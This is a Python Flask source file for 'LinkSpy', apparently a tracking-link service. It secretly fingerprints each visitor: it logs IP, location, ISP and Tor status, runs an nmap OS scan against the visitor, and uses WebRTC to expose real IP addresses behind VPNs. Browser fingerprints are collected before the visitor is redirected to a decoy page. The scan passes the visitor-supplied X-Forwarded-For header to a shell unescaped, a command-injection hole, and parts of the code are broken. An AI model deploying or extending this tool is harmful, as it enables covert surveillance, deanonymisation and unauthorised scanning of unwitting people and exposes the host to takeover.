from flask import Flask, request, jsonify, make_response, redirect
import os
import datetime
import json
import socket
import geoip2.database
from user_agents import parse
import hashlib
import subprocess
import requests
import pyshark
import re

app = Flask(__name__)

# Paths and config
LOG_DIR = "fingerprints"
GEOIP_CITY_DB = "GeoLite2-City.mmdb"
GEOIP_ASN_DB = "GeoLite2-ASN.mmdb"
REDIRECT_URL = "https://example.com"  # Customize this
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Nmap scan for TCP/IP and OS fingerprinting
def run_nmap_scan(ip):
    try:
        # Basic Nmap scan for OS, TCP/IP, MTU (requires root)
        cmd = f"nmap -O --osscan-guess -sT {ip}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        nmap_data = {
            "raw_output": result.stdout,
            "os_estimate": re.search(r"OS details: (.*?)\n", result.stdout) or "unknown",
            "mtu": re.search(r"MTU: (\d+)", result.stdout) or "unknown",
            "link_type": "unknown"  # Requires deeper packet analysis
        }
        return nmap_data
    except Exception as e:
        return {"error": str(e)}

# Basic JA3/JA4 TLS fingerprinting (placeholder; needs tshark/mitmproxy)
def get_tls_fingerprint(ip):
    try:
        # Use pyshark to capture TLS ClientHello (simplified)
        capture = pyshark.LiveCapture(interface='eth0', bpf_filter=f'src host {ip} and port 443')
        capture.sniff(timeout=5)
        ja3 = "unknown"  # Requires JA3 parsing library
        ja4 = "unknown"  # Requires JA4 parsing library
        return {"ja3": ja3, "ja4": ja4, "tls_fingerprint": "unknown"}
    except:
        return {"ja3": "unknown", "ja4": "unknown", "tls_fingerprint": "unknown"}

# WHOIS and Tor relay check
def get_whois_tor(ip):
    try:
        # WHOIS via ip-api.com
        whois_response = requests.get(f"http://ip-api.com/json/{ip}").json()
        tor_response = requests.get(f"https://check.torproject.org/api/exit?ip={ip}").json()
        return {
            "whois": {
                "isp": whois_response.get("isp", "unknown"),
                "org": whois_response.get("org", "unknown"),
                "network": whois_response.get("as", "unknown"),
                "usage_type": "unknown"  # Requires premium API
            },
            "tor": {
                "is_tor": tor_response.get("Exit", False),
                "relays": tor_response.get("Relays", [])
            }
        }
    except:
        return {"whois": {}, "tor": {"is_tor": "unknown", "relays": []}}

# Geolocation lookup
def get_geo_info(ip):
    try:
        city_reader = geoip2.database.Reader(GEOIP_CITY_DB)
        asn_reader = geoip2.database.Reader(GEOIP_ASN_DB)
        city_response = city_reader.city(ip)
        asn_response = asn_reader.asn(ip)
        return {
            "country": city_response.country.name or "unknown",
            "region": city_response.subdivisions.most_specific.name or "unknown",
            "city": city_response.city.name or "unknown",
            "timezone": city_response.location.time_zone or "unknown",
            "local_time": datetime.datetime.now().astimezone().isoformat(),
            "coordinates": {
                "latitude": city_response.location.latitude or "unknown",
                "longitude": city_response.location.longitude or "unknown"
            },
            "isp": asn_response.autonomous_system_organization or "unknown",
            "asn": asn_response.autonomous_system_number or "unknown"
        }
    except:
        return {
            "country": "unknown",
            "region": "unknown",
            "city": "unknown",
            "timezone": "unknown",
            "local_time": "unknown",
            "coordinates": {"latitude": "unknown", "longitude": "unknown"},
            "isp": "unknown",
            "asn": "unknown"
        }

# Save fingerprint to file
def save_fingerprint(data):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(LOG_DIR, f"fingerprint_{timestamp}.txt")
    with open(filename, "w") as f:
        f.write(json.dumps(data, indent=4))
    return filename

@app.route('/')
def index():
    # Get client IP
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()

    # Parse user agent
    ua_string = request.headers.get('User-Agent', 'unknown')
    user_agent = parse(ua_string)

    # Get HTTP headers
    headers = dict(request.headers)

    # Geolocation, WHOIS, Tor
    geo_info = get_geo_info(ip)
    whois_tor = get_whois_tor(ip)

    # Nmap scan (TCP/IP, OS, MTU)
    nmap_info = run_nmap_scan(ip)

    # TLS fingerprint (JA3/JA4)
    tls_info = get_tls_fingerprint(ip)

    # Initial fingerprint data
    fingerprint = {
        "ip_address": ip,
        "hostname": socket.getfqdn(ip) if ip else "unknown",
        "user_agent": {
            "raw": ua_string,
            "browser": user_agent.browser.family,
            "version": user_agent.browser.version_string,
            "os": user_agent.os.family,
            "os_version": user_agent.os.version_string,
            "device": user_agent.device.family
        },
        "headers": headers,
        "geo_info": geo_info,
        "whois_tor": whois_tor,
        "nmap_info": nmap_info,
        "tls_info": tls_info,
        "timestamp": datetime.datetime.now().isoformat()
    }

    # Save initial data
    save_fingerprint(fingerprint)

    # Customizable page title
    PAGE_TITLE = "LinkSpy"  # Project name

    # Serve fingerprinting page
    response = make_response("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>{}</title>
        <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.4/fingerprint2.min.js"></script>
        <style>
            @media (min-width: 0px) {{ .media-test-0 {{ display: block; }} }}
            @media (min-width: 320px) {{ .media-test-320 {{ display: block; }} }}
            @media (min-width: 768px) {{ .media-test-768 {{ display: block; }} }}
            @media (min-width: 1024px) {{ .media-test-1024 {{ display: block; }} }}
            @media (min-width: 1440px) {{ .media-test-1440 {{ display: block; }} }}
            .hidden {{ display: none; }}
        </style>
    </head>
    <body>
        <div class="media-test-0 hidden" data-query="min-width-0"></div>
        <div class="media-test-320 hidden" data-query="min-width-320"></div>
        <div class="media-test-768 hidden" data-query="min-width-768"></div>
        <div class="media-test-1024 hidden" data-query="min-width-1024"></div>
        <div class="media-test-1440 hidden" data-query="min-width-1440"></div>
        <canvas id="canvas" style="display: none;"></canvas>
        <script>
            // CSS Media Queries
            function getMediaQueries() {{
                const queries = [];
                document.querySelectorAll('[data-query]').forEach(el => {{
                    if (window.getComputedStyle(el).display !== 'none') {{
                        queries.push(el.getAttribute('data-query'));
                    }}
                }});
                return queries;
            }}

            // ClientRects Fingerprinting
            function getClientRects() {{
                const div = document.createElement('div');
                div.style.position = 'absolute';
                div.style.width = '100px';
                div.style.height = '100px';
                document.body.appendChild(div);
                const rects = div.getClientRects();
                const rectData = Array.from(rects).map(rect => ({{
                    top: rect.top,
                    left: rect.left,
                    width: rect.width,
                    height: rect.height
                }}));
                document.body.removeChild(div);
                return rectData;
            }}

            // WebRTC Leak Test
            function getWebRTC() {{
                return new Promise(resolve => {{
                    if (!window.RTCPeerConnection) {{
                        resolve({{enabled: false, addresses: []}});
                        return;
                    }}
                    const pc = new RTCPeerConnection({{iceServers: [{{urls: 'stun:stun.l.google.com:19302'}}]}});
                    const addresses = [];
                    pc.onicecandidate = e => {{
                        if (e.candidate && e.candidate.candidate) {{
                            const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                            if (ip) addresses.push(ip[0]);
                        }}
                    }};
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    setTimeout(() => {{
                        pc.close();
                        resolve({{enabled: true, addresses: addresses}});
                    }}, 1000);
                }});
            }}

            // DNS Leak Test (simulated; requires external DNS server for full test)
            function getDNSLeak() {{
                return {{dns_servers: 'unknown'}}; // Placeholder
            }}

            // WebGPU Detection
            function getWebGPU() {{
                if (navigator.gpu) {{
                    return {{supported: true, adapter: navigator.gpu.requestAdapter()}};
                }}
                return {{supported: false}};
            }}

            // Client Hints
            function getClientHints() {{
                if (navigator.userAgentData) {{
                    return navigator.userAgentData.getHighEntropyValues([
                        'architecture', 'model', 'platform', 'platformVersion', 'fullVersionList'
                    ]).then(hints => hints);
                }}
                return {{supported: false}};
            }}

            // Legacy Plugin Detection (Flash, Silverlight, Java)
            function getLegacyPlugins() {{
                const plugins = [];
                if (navigator.plugins) {{
                    for (let plugin of navigator.plugins) {{
                        plugins.push({{name: plugin.name, description: plugin.description}});
                    }}
                }}
                return {{
                    flash: plugins.some(p => p.name.includes('Flash')),
                    silverlight: plugins.some(p => p.name.includes('Silverlight')),
                    java: plugins.some(p => p.name.includes('Java'))
                }};
            }}

            // Chrome Extension Detection (basic)
            function getChromeExtensions() {{
                const extensions = [];
                if (window.chrome && chrome.runtime) {{
                    extensions.push('chrome_runtime_detected');
                }}
                return extensions;
            }}

            // Do Not Track
            function getDoNotTrack() {{
                return navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || 'unknown';
            }}

            // Collect all fingerprints
            setTimeout(async () => {{
                const fp = await Fingerprint2.getPromise();
                const components = fp.reduce((acc, c) => {{
                    acc[c.key] = c.value;
                    return acc;
                }}, {{}});
                components.media_queries = getMediaQueries();
                components.client_rects = getClientRects();
                components.webrtc = await getWebRTC();
                components.dns_leak = getDNSLeak();
                components.webgpu = getWebGPU();
                components.client_hints = await getClientHints();
                components.legacy_plugins = getLegacyPlugins();
                components.chrome_extensions = getChromeExtensions();
                components.donottrack = getDoNotTrack();

                fetch('/submit_fingerprint', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{ip: '{}', fingerprint: components}})
                }}).then(() => {{
                    window.location.href = '{}';
                }});
            }}, 1500);
        </script>
    </body>
    </html>
    """.format(PAGE_TITLE, ip, REDIRECT_URL))
    response.set_cookie('session_id', hashlib.md5(ip.encode()).hexdigest(), max_age=3600)
    return response

@app.route('/submit_fingerprint', methods=['POST'])
def submit_fingerprint():
    data = request.json
    ip = data.get('ip')
    fingerprint = data.get('fingerprint', {})
    
    # Combine with server-side data
    full_fingerprint = {
        "ip_address": ip,
        "fingerprint": fingerprint,
        "timestamp": datetime.datetime.now().isoformat()
    }
    
    # Save to file
    save_fingerprint(full_fingerprint)
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)